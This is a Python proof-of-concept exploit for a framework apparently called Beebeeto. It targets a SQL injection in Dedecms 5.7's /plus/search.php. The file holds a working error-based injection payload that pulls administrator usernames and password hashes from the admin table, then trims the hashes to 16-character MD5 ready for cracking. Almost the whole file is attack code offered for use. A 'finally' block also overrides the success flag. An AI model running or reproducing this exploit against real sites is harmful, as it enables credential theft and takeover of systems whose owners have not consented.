#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import time
import urllib2
import urllib
import cookielib 

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
            # poc相关信息
            'poc': {
                'id': 'poc-2014-0077',# 由Beebeeto官方编辑
                'name': 'Dedecms 5.7 /plus/search.php SQL注入漏洞 Exploit',  # 名称
                'author': 'beeOver',  # 作者
                'create_date': '2014-10-17',  # 编写日期
                },
            # 协议相关信息
            'protocol': {
                'name': 'http',  # 该漏洞所涉及的协议名称
                'port': [80],  # 该协议常用的端口号，需为int类型
                'layer4_protocol': ['tcp'],  # 该协议
                },
            # 漏洞相关信息
            'vul': {
                'app_name': 'Dedecms',  # 漏洞所涉及的应用名称
                'vul_version': ['5.7'],  # 受漏洞影响的应用版本
                'type': 'SQL Injection',  # 漏洞类型
                'tag': ['Dedecms漏洞', '/plus/search.php', 'Sql injection'],  # 漏洞相关tag
                'desc': 'Dedecms cms website have sql injection error in search.php.',  # 漏洞描述
                'references': ['http://zone.wooyun.org/content/2414',  # 参考链接
                    ],
                },
            }

 
    @classmethod
    def verify(cls, args):
        search_poc = ("/plus/search.php?keyword=as&typeArr[111%3D@`\%27`)+and+(SELECT+1+FROM+(select+count(*),"
                    "concat(floor(rand(0)*2),(substring((select+group_CONCAT(0x5e,0x24,userid,0x7c,pwd,0x24,0x5e)"
                    "+from+`%23@__admin`+limit+0,5),1,62)))a+from+information_schema.tables+group+by+a)b)%23@`\%27`+]=a")
        attack_url = args['options']['target'] + search_poc
        user_agent = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.57 Safari/537.36'}
        request = urllib2.Request(attack_url,headers=user_agent)
        args["success"] = False
        args['poc_ret']['tips'] = "May be this website not have this bug."
        try:
            response = urllib2.urlopen(request)
            if response.getcode() == 200:
                admin_result = ""
                content = response.read()
                reg_admin = re.compile("(?<=\^\$).*?(?=\$\^)")
                admin_info = reg_admin.findall(content)
                admin_info_duplicate = sorted(set(admin_info),key=admin_info.index)
                if len(admin_info_duplicate) >0 :
                    args['success'] = True
                    args['poc_ret']['vul_url'] = attack_url
                    #返回用户名密码列表，例如:admin|7a57a5a743894a0e,ads|8957a5a743894a04
                    for info in admin_info_duplicate:
                        info_list = info.split("|")
                        info_name = info_list[0]
                        #Dedecms密码转换成16位md5需要从dedecms加密密码第四位开始截取16个字符
                        info_pwd = info_list[1][3:19]
                        admin_result = admin_result + info_name +"|"+ info_pwd +","
                    args['poc_ret']['tips'] = " we get <admin|password>:" + admin_result
                    return args
        except urllib2.URLError as e:
            args["success"] = False
            return args
        finally:
            args["success"] = False
            return args

    exploit = verify

if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())